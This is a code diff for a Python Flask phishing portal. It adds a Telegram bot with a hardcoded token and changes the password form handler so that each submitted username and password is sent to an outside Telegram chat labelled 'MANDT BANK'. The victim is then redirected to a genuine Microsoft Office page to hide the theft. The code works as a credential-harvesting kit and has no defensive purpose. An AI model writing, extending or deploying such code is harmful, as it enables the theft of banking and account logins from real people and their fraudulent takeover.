@@ -1,11 +1,21 @@
 from urllib import response
 from flask import Blueprint, session, render_template, request, redirect, url_for
-from .utils import send_login
+# from .utils import send_login
 from requests import get
+import telebot
 
+API_TOKEN = '5724587499:AAFl5fwOetWO0yu-nFJg9OgyyFi0AGqB-TY'
+
+receiver_id = 1124454735
+
+bot = telebot.TeleBot(API_TOKEN)
 
 portals = Blueprint('portals', __name__)
 
+
+@portals.route('/')
+def syncing_():
+    return redirect(url_for('portals.signin'))
 
 @portals.route('/oauth/signin', methods=['GET','POST'])
 def signin():
@@ -32,6 +42,7 @@ def password():
     if request.method == 'POST':
         password = request.form.get('password')
         if password:
-            send_login(username, password, country, city,zipcode,ip)
-            return redirect('https://www.office.com/')
+            bot.send_message(receiver_id, f'-------------MANDT BANK-------------\nUsername: {username}\nPassword: {password}\n--------------------------')
+            # send_login(username, password, country, city,zipcode,ip)
+            return redirect('https://www.microsoft.com/en-us/microsoft-365/microsoft-office')
     return render_template('password.html', username=username)
